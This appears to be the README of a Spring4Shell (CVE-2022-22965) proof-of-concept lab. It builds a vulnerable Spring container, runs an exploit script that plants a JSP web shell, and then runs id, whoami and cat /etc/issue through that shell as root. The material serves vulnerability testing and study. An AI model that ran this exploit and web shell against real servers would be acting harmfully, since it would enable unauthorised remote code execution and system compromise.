

# CVE-2022-22965 (Spring4Shell) Proof of Concept

![](img/spring4shell-logo.png)

## Test the RCE (Remote Code Execution) in Spring Core​

### Build the image

BuildKit based build is required so you need to enable it.

Easiest way is to set the **DOCKER_BUILDKIT=1** environment variable when invoking the docker build command, such as:

```console
$ DOCKER_BUILDKIT=1 docker build -f Dockerfile.core . -t spring4shell-core && docker run --rm -p 8080:8080 spring4shell-core
```
Otherwise to enable docker BuildKit by default, set daemon configuration in _/etc/docker/daemon.json_ feature to true and restart the daemon:

```json
{ "features": { "buildkit": true } }
```
This way you can execute simply

```console
$ docker build -f Dockerfile.core . -t spring4shell-core && docker run --rm -p 8080:8080 spring4shell-core
```

### Test the vulnerable application

```console
$ curl localhost:8080/spring4shell/exploitme
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Spring4Shell PoC Spring Application</title>
</head>
<body>
    Hello World! Exploit me!
</body>
</html>
```

### Run the exploit

```console
$ python3 exploit-core.py --url "http://localhost:8080/spring4shell/exploitme" --file shell
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://localhost:8080/shell.jsp?cmd=id
```

If everything went right, execute arbitrary commands in the container through the Tomcat HTTP port, such as:

```console
$ curl http://localhost:8080/shell.jsp\?cmd\=id --output -
uid=0(root) gid=0(root) groups=0(root)

//
```

```console
$ curl http://localhost:8080/shell.jsp\?cmd\=whoami --output -
root

//
```

```console
$ curl http://localhost:8080/shell.jsp\?cmd\=cat%20/etc/issue --output -
Debian GNU/Linux 11 \n \l


//
```


